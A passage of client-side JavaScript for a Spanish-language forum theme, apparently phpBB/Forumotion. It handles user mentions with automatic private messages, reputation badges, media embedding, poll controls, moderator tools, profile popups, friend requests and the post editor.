                                    fontSize: '18px',
                                    fontFamily: 'monda',
                                    color: 'red',
                                    marginLeft: '-38px',
                                },
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-exclamation-triangle',
                                    attributes: {
                                        'aria-hidden': 'true'
                                    }
                                }, {
                                    tag: 'span',
                                    text: 'Invitado para ver el código debes estar registrado'
                                }]
                            });
                        if (w.length) {
                            init.myarray(w, function (i) {
                                var
                                    b = init.g('ol', i)[0];
                                init.replaceHTML(a, b)
                            });
                        }
                    }, 500)
                },
                arroba: function (c) {
                    var t_A = pu && ops.perfil.main.tabId('muro'),
                        e = c.value,
                        g = '/privmsg?mode=post&post=1',
                        h = 'inbox',
                        i = 'post',
                        j = 'Se mencionó con éxito',
                        k = 'Send',
                        d = '[Mensaje automático]: Te he mencionado en: ' + (t_A || tm ? ops.titulo_pagina : ind && 'mi muro, en el indice'),
                        f = '[quote]Hola {USERNAME}, Te he mencionado en :[url=' + window.location + ']' + ops.titulo_pagina + '[/url] \n ' + (t_A || tm ? e[0] : ind && 'Mi muro[/url] \n' + e[0]) + '[/quote]';
                    if ('@' === e.split('')[e.length - 1]) {
                        e.split('@');
                        $.boxes({
                            mode: 'prompt',
                            title: 'Introduce el nombre del usuario a mencionar Un mensaje de notificación será enviado',
                            ok: function () {
                                var t, boxinput = init.g('.zzBoxes_input'),
                                    s = boxinput.length && (boxinput[0]);
                                t = s.value;
                                c.value += t;
                                tm && c.focus();
                                ops.temas.main.post_mw(t, d, f, g, i, j, h, k, '');
                            },
                            cancel: function () {
                                return false
                            }
                        })
                    }
                },
                twt: function () {
                    ! function (d, s, id) {
                        var js, fjs = init.g(s, d)[0],
                            p = /^http:/.test(d.location) ? 'http' : 'https';
                        if (!init.g('#' + id, d)) {
                            js = d.createElement(s);
                            js.id = id;
                            js.src = p + '://platform.twitter.com/widgets.js';
                            fjs.parentNode.insertBefore(js, fjs);
                        }
                    }(document, 'script', 'twitter-wjs');
                },
                fb_w: function () {
                    (function (d, s, id) {
                        var js, fjs = init.g(s, d)[0];
                        if (init.g('#' + id, d)) return;
                        js = d.createElement(s);
                        js.id = id;
                        js.src = "//connect.facebook.net/{LANGUAGE}/all.js#xfbml=1";
                        fjs.parentNode.insertBefore(js, fjs);
                    }(document, 'script', 'facebook-jssdk'));
                },
                nivelReputacion: function (d) {
                    try{
                    var c, Class, Nclass, texto, e = d || init.g('.post');
                    
                    init.myarray(e, function (i) {
                        var a = init.g('.perfil_texto', i)[6] ? Number(init.g('.perfil_texto', i)[6].textContent) : '0',
                            b = init.g('.reputacion', i)[0];
                        if (!i.classList.contains('baneado') ||  !init.g('.nick', i)[0].textContent == 'Invitado') {

                            switch (true) {
                                case (a == 0):
                                    Class = ' zero';
                                    Nclass = '0';
                                    texto = ' Sin reputación';
                                    break;
                                case (a >= 1 && a < 10):
                                    Class = ' iniciante';
                                    Nclass = '1';
                                    texto = ' Principiante';
                                    break;
                                case (a >= 10 && a < 30):
                                    Nclass = '2';
                                    Class = ' regular';
                                    texto = ' Regular';
                                    break;
                                case (a >= 30 && a < 50):
                                    Nclass = '3';
                                    Class = ' bueno';
                                    texto = ' Bueno';
                                    break;
                                case (a >= 50 && a < 100):
                                    Class = ' optimo';
                                    Nclass = '4';
                                    texto = ' Óptimo';
                                    break;
                                case (a >= 100 && a < 200):
                                    Class = ' excelente';
                                    Nclass = '5';
                                    texto = ' Excelente';
                                    break;
                                case (a >= 200 && a < 400):
                                    Class = ' destacado';
                                    Nclass = '6';
                                    texto = ' Destacado';
                                    break;
                                case (a >= 400 && a < 600):
                                    Class = ' elite';
                                    Nclass = '7';
                                    texto = ' Elite';
                                    break;
                                case (a >= 600):
                                    Class = ' maximo';
                                    Nclass = '8';
                                    texto = ' Supremo';
                                    break
                            }
                            i.className += Class;
                            init.move(b, init.create('span', {
                                class: 'rv rLv' + Nclass,
                                html: ops.lang.thumbs + a,
                                text: texto
                            }), 'append');
                        }
                    })
                    } catch (e) {
                    console.error(e)
                }
                },
                youtubeTamaño: function () {
                    var e = init.g('iframe'),
                        i = e.length;
                    init.myarray(e, function (i) {
                        /youtu/g.test(i.src) && (i.setAttribute('width', '785'), i.setAttribute('height', '420'))
                    })
                },
                youtubeEmbed: function () {
                    var e = init.g('a');
                    init.myarray(e, function (i) {
                        if ('undefined' != typeof i) {
                            var b, a = i.href.match(/(?:v=|v\/|embed\/|youtu.be\/)(.{11})/);
                            if (a && a[1]) {
                                b = init.elem('iframe', {
                                    width: '785',
                                    height: '420',
                                    src: 'https://www.youtube.com/embed/' + a[1],
                                    frameborder: '0'
                                });
                                init.move(i, b, 'replaceWith')
                            }
                        }
                    })
                },
                imgauto: function () {
                    var e = document.querySelectorAll('.post .content a'),
                        t = document.URL.replace(location.hash, '').replace(location.pathname, ''),
                        o = /\.(png|jpg|jpeg|gif)$/i;
                    init.myarray(e, function (i) {
                        if (i.innerHTML === i.href) {
                            if (o.test(i.href)) {
                                var a = init.elem('img', {
                                    className: 'auto-img',
                                    alt: '',
                                    src: i.href
                                });
                                init.move(i, a, 'replaceWith')
                            }
                            0 === i.href.indexOf(t) && (i.innerHTML = i.href.substring(i.href.lastIndexOf('/')));
                        }
                    });
                    setTimeout(ops.temas.main.imgResize(), 50);
                },
                imgResize: function () {
                    var c, a = document.querySelectorAll('.post .content img');
                    init.myarray(a, function (b) {
                    if  (!b.hasAttribute('longdesc') && !b.classList.contains('like_avatar')){
                        b.classList.add('fa_resized');
                        b.addEventListener('click', function () {
                            c = this.src;
                            ops.box('<img src="' + c + '">', 'Viendo una imagen:')

                    }, false);

                    }
                    })
                },
                setMod: function () {
                    ops.mod.init();
                    if (ops.autor_tema === ops.mi_nombre || ops.soy_staff) {
                        var prefijos = ['Ocio', 'Aviso', 'Pedido', 'Actualizado', 'Sugerencia', 'Publicidad', 'Afiliación', 'Ayuda', 'Recursos', 'Resuelto', 'Beta', 'Tutorial', 'CSS', 'jQuery', 'Javascript', 'Staff', 'Novedades', 'Html', 'Widget', 'phpBB3', 'PunBB', 'Invision', 'Todas', 'Revisado', 'Cerrado', 'Duda', 'Skin', 'Sugerencia', 'Esperando datos'],
                            e = '<option name="" value="">Cambia el prefijo ajax</option>',
                            a = init.elem('select', {
                                id: 'prefTM',
                                onchange: 'ops.mod.editartitulo.cambiarPrefijo(this.value); return false',
                                innerHTML: e,
                                style: {
                                    marginTop: '-8%',
                                    float: 'right'
                                }
                            }),
                            b = init.g('.tema-info')[0];
                        init.move(b, a, 'append');
                        for (b in prefijos) {
                            var d = init.elem('option', {
                                value: '[' + prefijos[b] + ']',
                                innerHTML: prefijos[b],
                            });
                            init.move(a, d, 'append');
                        }
                    }
                    if (ops.soy_staff) {
                        var e = init.g('.ip');
                        init.myarray(e, function (i) {
                            i.firstChild.setAttribute('onclick', 'ops.mod.ip(this); return false');
                        });
                        var z = "display:none;text-indent: -1px;",
                            d = "display:none;",
                            html = '<a href="#" onclick="ops.mod.ver(this); return false"><i class="fab fa-tripadvisor" style="' + d + '" ></i></a><a id="en_curso_" href="#" onclick="ops.mod.enCurso(); return false"><i class="fa fa-history soporte" style="' + d + '"></i></a><a id="archivar_" href="#" onclick="ops.mod.resuelto.main(this); return false"><i class="fa fa-archive soporte" style="' + z + '"></i></a><a href="#" class="actived_tag" onclick="ops.temas.main.activarTags(this); return false"><i class="fa fa-tags"></i></a>',
                            mod = init.g('.moderar');
                        init.myarray(mod, function (i) {
                            init.insertar(i, html, 'prepend');
                        });
                    }
                    var nav = init.g('.nav');
                    init.myarray(nav, function (i) {
                        if (/\/f(4|5|6|7|11|15|16)(p[0-9]+)?-/.test(i.href)) {
                            var visor = init.g('.fa-tripadvisor');
                            init.myarray(visor, function (i) {
                                i.className += ' active';
                                init.show(i, 'inline-block');
                            })
                        }
                    });
                    if (ops.num_sub_section == 'f12' || ops.num_sub_section == 'f14') {
                        var sop = init.g('.soporte'),
                            l = sop.length;
                        for (var t = 0; t < l; t++) {
                            sop[t].classList.add('active');
                            sop[t].style.display = 'inline-block'
                        }
                    }
                },
                cancelPoll: function () {
                    var a = init.g('.c_vote');
                    a.length && a[0].addEventListener('click', function (i) {
                        i.preventDefault();
                        ops.xmlhRequest('action=cancel_vote', this.href, function (o) {
                            var b = o.responseXML;
                            init.move(init.g('#poll_result'), init.g('#poll_ballot', b), 'replaceWith');
                            ops.poll();
                        })
                    }, false);
                },
                poll: function () {
                    var d, h, t, m, a = init.g('.close_poll'),
                        b = a.length && init.g('a', a[0]),
                        c = '<i class="fa fa-times-circle poll_close" onclick="ops.temas.main.close_poll(this);return false" style="color:rgb(255, 0, 0)" title="Cerrar las votaciones"></i>',
                        e = init.g('#poll_ballot') ? init.g('#poll_ballot') : init.g('#poll_result'),
                        f = e && init.g('h3', e)[0],
                        g = init.g('.nick'),
                        m = init.g('.frm-buttons');
                    b.length > 0 && (b[0].innerHTML = c);
                    if (a.length && a[0].innerHTML == '' && ops.soy_staff) {
                        a[0].innerHTML == '';
                        f.insertAdjacentHTML('beforeend', '<i class="fa fa-folder-open open_poll" aria-hidden="true" onclick="ops.temas.main.open_poll(this)" style="cursor:pointer"></i>');
                    }
                    ops.temas.main.cancelPoll();
                    init.cachedScript('https://allphpbb31.com/js/poll.js');
                },
                submitPoll: function () {
                    var a = init.g("#poll_ballot"),
                        b = ops.serialize(a),
                        c = a.action;
                    ops.xmlhRequest(b, c, function (o) {
                        ops.xmlhRequest('', location.origin + location.pathname, function (o) {
                            var d = o.responseXML,
                                e = init.g('#poll_result', d);
                            zzPoll(e)
                        });
                    });
                },
                close_poll: function (c) {
                    var a, b, e = init.g('#poll_ballot') ? init.g('#poll_ballot') : init.g('#poll_result');
                    ops.xmlhRequest('', c.parentNode.href, function () {
                        ops.xmlhRequest('', document.location.pathname, function (o) {
                            a = o.responseXML;
                            b = init.g('#poll_result', a);
                            init.move(e, b, 'replaceWith');
                            init.fadeIn(b, '400');
                            ops.poll();
                        })
                    })
                },
                open_poll: function (c) {
                    var m = init.g('#poll_ballot') ? init.g('#poll_ballot') : init.g('#poll_result');
                    ops.xmlhRequest('', ops.path_edit, function (o) {
                        var e = o.responseXML,
                            a = ops.serialize(init.g('.ps', e)[0]) + '&poll_length=0&post=1';
                        ops.xmlhRequest(a, '/post', function () {
                            ops.xmlhRequest('', document.location.pathname, function (o) {
                                var a = o.responseXML,
                                    r = '<i class="fa fa-times-circle poll_close tooltipstered" onclick="ops.temas.main.close_poll(this);return false" style="color:rgb(255, 0, 0)"></i>';
                                var b = m,
                                    c = init.g('#poll_result', a);
                                b.innerHTML = c.innerHTML;
                                init.fadeIn(c, '400');
                                ops.poll()
                            });
                        })
                    })
                },
                getBackground: function (c) {
                    var d_pt = init.g('.perfil_texto')[1].innerHTML,
                        g = c[0].innerHTML,
                        m = /([\w-]+)=("|'|)(.*?)\2(?=[\s\]])/,
                        r = /(\[bkg[^\]]*?\])(?!.*\[bkg[^\]]*?\])((?:.|[\r\n])*?)\[\/bkg\]/,
                        l = /https?\:\/\/[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&\/\/=]*)/,
                        a = g.match(r),
                        p = a ? a[0].match(l)[0] : d_pt,
                        u = a && m.test(a) && !l.test(a[0].match(m)[3]) ? a[0].match(m)[3] : 'center center';
                    a && (c[0].innerHTML = g.replace(r, ''));
                    return 'url(' + p + ')' + u + ' / 110% no-repeat';
                },
                preTema: function () {
                    var t = init.g('.perfil_texto')[2].innerHTML,
                        i = init.g('.perfil_texto')[3].innerHTML,
                        e = init.g('#Name_post').innerHTML,
                        o = ops.logout ? init.g('figure')[0].lastChild.firstChild.src : init.g('figure')[0].lastChild.src,
                        n = init.g('.tema-info')[0],
                        s = init.g('.author_name')[0],
                        a = init.g('#url_a_t'),
                        r = init.g('.author-titulo')[0],
                        l = init.g('.avatar-titulo')[0],
                        u = init.g('.nav'),
                        c = [a, r],
                        p = init.g('.post'),
                        m = init.g('.temSolvedAdd'),
                        g = ops.num_sub_section,
                        d = 'color:' + t + '!important;text-shadow:' + i + '!important';
                    ops.autor_tema = s.textContent;
                    l.src = o, n.style.background = ops.temas.main.getBackground(p);
                    s.innerHTML = e;
                    init.myarray(c, function (t) {
                        t.style.cssText = d
                    });
                    for (var f = 0; f < u.length; f++) {
                        var v = u[f];
                        /\/c[0-9]\-.+/g.test(v.href) && init.borrar(v)
                    }
                    (ops.soy_staff && 'f14' == g || ops.soy_user && ops.mi_nombre === ops.autor_tema && 'f14' == g && m.length) && init.show(m[0], 'inline'); 
                    ops.temas.main.countPost()
                },
                countPost: function () {
                    var t, n, i, e = (init.g('.top'), init.g('.page-sep')),
                        o = init.g('.pag-img'),
                        s = o.length > 1 && o[1].previousElementSibling,
                        a = init.g('.countpost')[0],
                        g = init.last(init.g('.post')),
                        p = init.g('.postNumberContainer', g)[0],
                        r = Number(p.textContent.match(/\d+/g)),
                        u = e.length > 1 && 'STRONG' != init.last(e).nextSibling.tagName,
                        m = r - 1,
                        l = function (e) {
                            n = m > 1 ? ' tiene ' : 0 == m ? '' : ' tiene solo ';
                            i = 1 > m ? '' : ' respuesta' + (m > 1 ? 's.' : '.');
                            t = init.create('span', {
                                class: 'countpost',
                                style: {
                                    marginRight: '5px',
                                    marginTop: '6px'
                                },
                                text: n + e + i
                            });
                            init.move(a, t, 'append')
                        },
                        c = function (t) {
                            ops.xmlhRequest('', t, function (t) {
                                var n = t.responseXML,
                                    i = init.last(init.g('.postNumberContainer', n)),
                                    e = Number(i.textContent.match(/\d+/) - 1);
                                l(e)
                            })
                        },
                        h = u && 'A' == s.tagName ? s.href : '';
                    h ? c(h) : l(0 != m ? m : ' no tiene respuestas.')
                },
                r_wA: function () {
                    var e = init.g('.post'),
                        i = e.length;
                    init.myarray(e, function (i) {
                        var af = init.g('.add_friends', i).length;
                        if (af) {
                            i.className += ' no_amigo';
                            init.borrar(init.g('.post_wall', i)[0]);
                        }
                    });
                },
                ocultarprimerpost: function () {
                    var a = init.g('#Begin_'),
                        f = a && a.previousElementSibling,
                        g = a ? f && init.g('.descargar', f).length : 0,
                        h = init.g('.pagination').length > 1,
                        i = ops.num_sub_section === 'f14',
                        b = init.g('.paginatop'),
                        c = b.length && init.g('strong', b[0])[0].textContent == 1,
                        d = /(\<strong\>Recuerdo del primer mensaje\&nbsp\;\:\<\/strong\>)/,
                        e = '<span class="recprimtem"><i class="fas fa-thumbtack"></i></span></br>';
                    console.log('valor g ', g);
                    // si estoy en la pag 1 | si no hay paginacion | si hay descargas| si estas en soporte
                    a && g != null && (c || !h || g >= 1 || i ? (f.innerHTML = f.innerHTML.replace(d, e), f.classList.add('el_primero')) : init.borrar(f))
                },
                perfilmodal: {
                    dom: function (d, c) {
                        var activo = init.closest(c, '.post'),
                            e, f, g, h, l = init.g('.nick', activo)[0].textContent,
                            s = init.g('figure', activo)[0].firstChild.firstChild.src,
                            img = init.g('.perfil_texto', activo)[1].textContent,
                            aa = 'ops.temas.main.perfilmodal.active(\'wall\',this);',
                            ab = 'ops.temas.main.perfilmodal.active(\'perfil\',this);',
                            ac = 'ops.temas.main.perfilmodal.active(\'stats\',this);',
                            ad = 'ops.temas.main.perfilmodal.active(\'friends\',this);',
                            ae = 'ops.temas.main.perfilmodal.active(\'contact\',this);',
                            u = c.href,
                            a = init.create('div', {
                                childs: [{
                                    tag: 'div',
                                    class: 'profile_popup_nav',
                                    childs: [{
                                        tag: 'span',
                                        class: 'propop_tab',
                                        attributes: {
                                            id: 'propop_vm',
                                            onclick: aa
                                        },
                                        text: 'Muro'
                                    }, {
                                        tag: 'span',
                                        class: 'propop_tab activeTab',
                                        attributes: {
                                            id: 'propop_profile',
                                            onclick: ab
                                        },
                                        text: 'Perfil'
                                    }, {
                                        tag: 'span',
                                        class: 'propop_tab',
                                        attributes: {
                                            id: 'propop_stats',
                                            onclick: ac
                                        },
                                        text: 'Estadísticas'
                                    }, {
                                        tag: 'span',
                                        class: 'propop_tab',
                                        attributes: {
                                            id: 'propop_friends',
                                            onclick: ad
                                        },
                                        text: 'Amigos'
                                    }, {
                                        tag: 'span',
                                        class: 'propop_tab',
                                        attributes: {
                                            id: 'propop_contact',
                                            onclick: ae
                                        },
                                        text: 'Contacto'
                                    }, {
                                        tag: 'div',
                                        attributes: {
                                            id: 'perfil_ajax_info',
                                        },
                                        style: {
                                            position: 'relative',
                                            height: '30px',
                                            border: '1px solid',
                                            width: '100.4%',
                                            marginLeft: ' -3px',
                                            marginTop: '3px',
                                            background: 'rgb(63, 76, 107)'
                                        },
                                        childs: [{
                                            tag: 'div',
                                            attributes: {
                                                id: 'img_ajax_p',
                                            },
                                            style: {
                                                width: '100.1%',
                                                border: '1px solid #2D2C2C',
                                                margin: '0 auto',
                                                display: 'table',
                                                marginTop: '3px',
                                                marginLeft: '-1px',
                                                height: '81px',
                                                background: 'url(' + img + ')',
                                                backgroundSize: '220px'
                                            }
                                        }]
                                    }]
                                }, {
                                    tag: 'div',
                                    attributes: {
                                        id: 'userprofile'
                                    },
                                    html: ops.ajax_load,
                                    childs: [{
                                        tag: 'br'
                                    }, {
                                        tag: 'br'
                                    }, {
                                        tag: 'br'
                                    }]
                                }, {
                                    tag: 'span',
                                    attributes: {
                                        id: 'profileLinks'
                                    },
                                    childs: [{
                                        tag: 'a',
                                        attributes: {
                                            href: u
                                        },
                                        text: 'Ver perfil completo'
                                    }]
                                }]
                            })
                        ops.box(a, 'El perfil de ' + '<img id="userAVA" src="' + s + '"/>' + l, function () {
                            ops.temas.main.perfilmodal.ajax(d, init.g('#userprofile'));
                        });
                    },
                    active: function (d, c) {
                        var b = init.g('#userprofile'),
                            e = init.g('.activeTab');
                        b.innerHTML = '</br></br></br>' + ops.ajax_load;
                        e[0].classList.remove('activeTab');
                        c.classList.add('activeTab');
                        ops.temas.main.perfilmodal.ajax(d, b);
                    },
                    ajax: function (e, b) {
                        var cp, g, o,
                            t = init.g('a', init.g('#profileLinks'))[0].href,
                            a = '<div class="inner">';
                        ops.xmlhRequest('', t + (e == 'perfil' ? '' : e), function (x) {
                            o = x.responseXML;
                            cp = init.g('#cp-main', o);
                            g = cp.innerHTML;
                            b.innerHTML = e == 'friends' ? g.replace(a, '<div class="inner amigos">') : e == 'wall' ? '<div class="inner wall"><ol class="walltarget"></ol></div>' : g;
                            e == 'wall' && init.move(init.g('.walltarget')[0],  ops.indice.muro.array(o, 'ol'), 'append');
                            e == 'perfil' && init.cachedScript('https://allphpbb31.com/js/edit_c_ajx.js')
                        })
                    },
                },
                scrollAll: function () {
                    var a = document.body.scrollTop || window.pageYOffset,
                        b = init.g('.scrollToTop')[0],
                        c = init.g('.scrollToDown')[0];
                    a > 100 ? (init.fadeIn(b, 200), init.fadeOut(c, 200)) : (init.fadeOut(b, 200), init.fadeIn(c, 200))
                },
                up_s: function (c) {
                    ops.scroll.top('#top', 800);
                },
                dw_s: function (c) {
                    var a = init.g('*bottomtitle');
                    a.length && ops.scroll.top(a[0], 2e3);
                },
                sin_req: function () {
                    var j, l, k, a = init.g('.descargar'),
                        b = init.g('.pbutton1'),
                        c = init.g('.post')[0],
                        e = init.g('.content', c)[0],
                        d = init.create('div', {
                            class: 'fa_hello',
                            childs: [{
                                tag: 'i',
                                class: 'fa fa-tachometer',
                                attributes: {
                                    'aria-hidden': 'true'
                                }
                            }, {
                                tag: 'span',
                                text: 'Para ver los códigos debes tener al menos 6 comentarios en el foro'
                            }, {
                                tag: 'br',
                            }, {
                                tag: 'div',
                                attributes: {
                                    id: 'ultjava'
                                },
                                childs: [{
                                    tag: 'p',
                                    style: 'font-size: 12px;color:rgb(0, 0, 0);margin-bottom:0',
                                }, {
                                    tag: 'span',
                                    text: 'Puedes comentar en estos temas:'
                                }]
                            }]
                        });
                    if (a.length && _userdata.user_posts < 5) {
                        init.move(e, d, 'prepend', function () {
                            l = init.g('#ultjava');
                            ops.xmlhRequest('', '/feed/?f=8', function (x) {
                                var n, e = x.responseXML,
                                    t = init.g('title', e),
                                    s = 8 < t.length ? 8 : t.length;
                                for (var i = 2; i < s; i++) {
                                    j = init.g('link', e)[i].textContent;
                                    k = init.g('title', e)[i].textContent;
                                    n = init.create('a', {
                                        attributes: {
                                            href: j,
                                            style: 'display:block'
                                        },
                                        childs: [{
                                            tag: 'i',
                                            class: 'fa fa-circle',
                                            attributes: {
                                                'aria-hidden': 'true',
                                                style: 'font-size:12px',
                                            },
                                            childs: [{
                                                tag: 'p',
                                                text: k,
                                                attributes: {
                                                    style: 'display: inherit;'
                                                }
                                            }]
                                        }]
                                    });
                                    init.move(l, n, 'append', function () {
                                        ops.prefijos()
                                    });
                                }
                            });
                        });
                        if (a.length) {
                            init.myarray(init.g(ops.post_dom), function (i) {
                                init.contiene(i, '="descargar') && init.g('.quote', i).length && init.borrar(init.g('.quote', i)[0])
                            });
                        }
                        init.myarray(b, function (i) {
                            i.removeAttribute('onclick');
                            i.style.width = '200px';
                            i.textContent = 'Debes tener 6 comentarios';
                        });
                    }
                },
                añadir: {
                    array: [],
                    existe: function (l, b) {
                        init.myarray(l, function (i) {
                            var a = init.g('a', i),
                                b = ops.temas.main.añadir.array;
                            b[b.length] = /\/u(\d+)/g.test(a[0].href) && a[0].textContent;
                        });
                        'undefined' != typeof b && setTimeout(function () {
                            ops.temas.main.añadir.construir(b);
                            Cookies.set('amigos', ops.temas.main.añadir.array, {
                                expires: 1
                            })
                        }, 20000)
                    },
                    construir: function (b) {
                        try{
                        var j, d, k, g, r, m, n, q, amigos;
                        init.myarray(b, function (h) {
                             if(tm && init.g('.nick', h)[0].textContent != 'Invitado'){
                            j = tm ? init.g('.nick', h)[0] : ops.soy_staff && init.g('.name', h)[0];
                            d = j.textContent;
                            k = tm ? j.lastChild.href.match(/(\d+)$/g)[0] : ops.soy_staff && init.g('.url_staff', h)[0].href;
                            g = init.g('.frds', h);
                            names = Cookies.get('amigo_enviado'+ d) == d;
                            if (d !== ops.mi_nombre) {
                                r = -1 == ops.temas.main.añadir.array.indexOf(d);
                                n = r ? '/profile?friend=' + init.fixedEncodeURIComponent(d) + '&mode=editprofile&page_profil=friendsfoes' : '/profile?mode=editprofile&page_profil=friendsfoes&remove=' + k ;
                               init.elem(g[0],  {
                                    className: r ? 'pbutton3 add_friends' : 'pbutton3 delete_friend',
                                      onclick: 'ops.temas.main.add_frs(this, "'+ d +'");return false',
                                      style:{
                                      display:'inline'
                                      },
                                        href: n,
                                   innerHTML: names ? '<i class="fas fa-user-clock"></i> Solicitud pendiente'  :'<i class="'+ 'fas fa-' + (r ? 'user-plus' : 'user-minus') + '" id="'+ (r ? 'addFriend' : 'removeFriend') +'"></i>' + ( r ? ' Añadir a amigos' : ' Eliminar de amigos'),
                                   });
                                
                            }
                           }
                        });

                        tm && ops.temas.main.r_wA();
                        } catch (e) {
                    console.error(e)
                }
                    },
                    buscar: function (b) {
                        if (Cookies.get('amigos')) {
                            ops.temas.main.añadir.array = JSON.parse(Cookies.get('amigos'));
                            ops.temas.main.añadir.construir(b)
                        } else {
                            ops.xmlhRequest('', '/profile?mode=editprofile&page_profil=friendsfoes', function (o) {
                                var e = o.responseXML,
                                    p = init.g('.panel', e)[1],
                                    l = init.g('.friends-foes-list', p);
                                ops.temas.main.añadir.existe(l, b);
                            })
                        }
                    },
                    main: function () {
                        if (_userdata.session_logged_in){
                        var contenedor = tm ? init.g('.post') : ind ? init.g('.tooltipster-content') : ops.soy_staff && init.g('.profile');
                        ops.temas.main.añadir.array.length != 0 ? ops.temas.main.añadir.construir(contenedor) : ops.temas.main.añadir.buscar(contenedor)
                        }
                    },
                },
                add_frs: function (r, nick) {
                    var x, t = r.href;
                   ops.xmlhRequest('', t, function (o) {
                        x = o.responseXML;
                       if (init.contiene(init.g('#main', x), 'suprimido')){
                        var removeItemFromArr = ( arr, item ) => {
                            var i = arr.indexOf( item );
                            i !== -1 && arr.splice( i, 1 );
                        };
                        removeItemFromArr(ops.temas.main.añadir.array,nick);
 //regresar
                        r.innerHTML = '<i class="fas fa-user-plus" id="addFriend"></i> Añadir a amigos';
                        //init.contiene(t, 'remove') && Cookies.remove('amigos');
                        }else{
                        r.innerHTML = '<i class="fas fa-user-minus" id="removeFriend"></i> Solicitud enviada';
                        Cookies.set('amigo_enviado' + nick, nick, {
                            expires: 14
                        })
                        }
                    })
                },
                tagged: function (e, p) {
                    var a = e.textContent.match(/\S+/g)[0],
                        b = ops.textarea.value;
                    ops.temas.editor.start('reply', e, ops.url_reply, p);
                    ops.textarea.focus();
                    var subject = '[Mensaje automático]: Te he mencionado en: ' + ops.topic_name(),
                        message = '[quote]Hola {USERNAME}, Te he mencionado en :[url=' + window.location + ']' + ops.topic_name() + '[/url] \n ' + b + '[/quote]',
                        username = a,
                        online = init.closest(e, '.post').getAttribute('class');
                  !init.contiene(online, 'online') &&  ops.i_a(null, null, subject, message, username);
                    ops.textarea.value += '@' + a + ' '
                },
                editarElPrimerPost: function (subject, message, notify, topictype, id, poll, done) {
                    var uri = {
                        p: id,
                        mode: 'editpost',
                        subject: subject,
                        message: message,
                        edit_reason: '',
                        attach_sig: 1,
                        notify: notify,
                        post: 'Enviar',
                        topictype: topictype,
                        poll_length: poll
                    };
                    ops.xmlhRequest(uri, '/post', function () {
                        'undefined' != typeof done && done();
                        ops.toolbar.notify.go('Se editó con éxito el tema:' + opensource.ready(subject), null, 'check', 'fas fa-check-double')
                    })
                },
                stars: function () {
                    var a = init.g('.vote');
                    init.myarray(a, function (t) {
                        var c = init.g('.likecount', t),
                            e = c.length && c[0].textContent.match(/\d+/),
                            b = '<i class="fa fa-star"></i>',
                            d = e >= 2 ? b : e >= 5 ? init.repeat(b, 3) : e >= 7 && init.repeat(b, 5);
                        d > '0' && init.insertar(t, '<p class="popular_post">' + d + '</p>', 'prepend')
                    })
                },
                temasCerrados: function () {
                    var a = init.g('#url_a_t'),
                        d = init.g('.titulo-tema')[0],
                        e = init.g('.pbutton1'),
                        Class = d.className,
                        alt = a.getAttribute('alt');
                    init.contiene(alt, 'cerrado') && (init.elem(d, {
                        className: Class + ' lock-theme',
                        style: {
                            background: 'url(' + ops.lang.l_iM + ')rgba(237,36,20,0.35)'
                        },
                    }), init.insertar(d, '<i class="fa fa-lock"></i>', 'prepend'), init.myarray(e, function (i) {
                        i.removeAttribute('onclick');
                        i.textContent = 'Tema Cerrado'
                    }));
                },
                mnl: function () {
                    var a = init.g('.plusmenu'),
                        b = a.length;
                    b && init.borrar(a[0])
                },
                pathFormat: function () {
                    var c, d, a = tm ? init.g('.pathname-box') : init.g('.nomargin'),
                        b = '<i class="fa fa-home" style="font-size: 34px;"></i>';
                    if (a)
                        init.myarray(a, function (i) {
                            i.innerHTML = i.innerHTML.replace(/::/g, '');
                            init.g('.nav', i)[0].innerHTML = b
                        });
                },
            },
            editor: {
                preStart: function (d, c, f) {
                    ops.postActivo = init.closest(c, '.post');
                    var j = ops.postActivo,
                        l = init.g('.long_post', j),
                        a = init.g('.nick', j)[0],
                        c = init.g('.nombre-tema', j)[0];
                    ops.mp_info = init.g('.mp-msg');
                    ops.mode = init.g('.mode-button');
                    ops.data = init.g('#editor-data').firstChild;
                    ops.message_dom = init.g('.zeditor-message', j)[0];
                    ops.nombre_editor = a.lastChild.textContent;
                    ops.url_tema = c.firstChild.href;
                    ops.autor_id = a.textContent != 'Invitado' ? init.uid(a.lastChild.href) : '0';
                    ops.mp_info.length && (init.hide(ops.mp_info[0]));
                    ops.notice.innerHTML = _userdata.user_posts >= 5 ? ops.lang.notice_text_a : ops.lang.notice_text_b;
                    ops.editor.classList.remove('edit-mode', 'quote-mode', 'pm-mode', 'wall-mode', 'reply-mode', 'maxim');
                    init.move(ops.message_dom, ops.editor, 'append', function () {
                        init.show(ops.editor, 'inherit');
                        l.length && (l[0].style.height = '100%');
                        ops.temas.editor.innerHTML_save();
                        ops.back();
                        j.style.opacity = 1;
                        ops.temas.editor.keyupTextarea();
                        ops.beforeUnload(ops.textarea);
                        ops.temas.main.offset_post(j);
                        d != 'quote' && ops.textarea.focus();
                    });
                },
                start: function (d, c, e, f) {
                    ops.temas.editor.preStart(d, c, f);
                    switch (d) {
                        case 'reply':
                            ops.editor.className = 'reply-mode';
                            ops.url = e;
                            ops.data.value = 'reply',
                            ops.mode.length && (ops.mode[0].innerHTML = ops.lang.reply);
                            ops.placeholder(ops.textarea, ops.mi_nombre + ' escribe un comentario...');
                            '' !== ops.textarea.value && (ops.notice.innerHTML = ops.mi_nombre + ops.lang.notice_reply, ops.send_button.style.background = 'rgba(255, 215, 0, 1)');
                            ops.temas.editor.limite.main(d);
                            break;
                        case 'wall':
                            var o = ops.nombre_editor;
                            ops.notice.innerHTML = ops.lang.notice_wall + o,
                                ops.editor.className = 'wall-mode',
                                ops.url = !1,
                                ops.mode.length && (ops.mode[0].innerHTML = 'Modo: Muro'),
                                ops.placeholder(ops.textarea.placeholder, ops.mi_nombre + ' envia un mensaje al muro de ' + o);
                            break;
                        case 'quote':
                            ops.url = '/post?t=' + ops.id_tema + '&mode=reply';
                            ops.temas.editor.selection() && ops.temas.editor.selection().length ? ops.temas.editor.quoteSelection() : ops.temas.editor.quote(c,  f);
                            ops.notice.innerHTML = ops.lang.notice_quote;
                            ops.editor.className = 'quote-mode';
                            ops.mode.length && (ops.mode[0].innerHTML = ops.lang.quote);
                            ops.temas.editor.limite.main(d);
                            break;
                        case 'edit':
                            ops.temas.editor.edit(c),
                                ops.data.value = 'editpost',
                                ops.notice.innerHTML = ops.lang.notice_edit,
                                ops.editor.className = 'edit-mode',
                                ops.mode.length && (ops.mode[0].innerHTML = ops.lang.edit),
                                ops.send_button.innerHTML = 'Guardar';
                            break;
                        case 'pm':
